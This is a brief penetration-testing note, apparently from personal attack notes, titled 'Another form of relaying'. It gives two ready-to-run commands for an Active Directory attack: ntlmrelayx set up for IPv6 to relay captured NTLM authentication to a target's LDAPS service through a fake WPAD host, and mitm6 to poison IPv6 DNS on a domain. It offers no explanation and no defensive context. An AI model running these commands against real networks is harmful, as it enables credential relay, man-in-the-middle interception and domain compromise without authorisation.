Another form of relaying

- Set up ntlmrelayx with ipv6
	```ntlmrelayx
	ntlmrelayx.py -6 -t ldaps://<Target-IP> -wh fakewpad.<domain> -l <output>
	```

- Run mitm6
	```mitm6
	sudo mitm6 -d <DOMAIN>
	```
	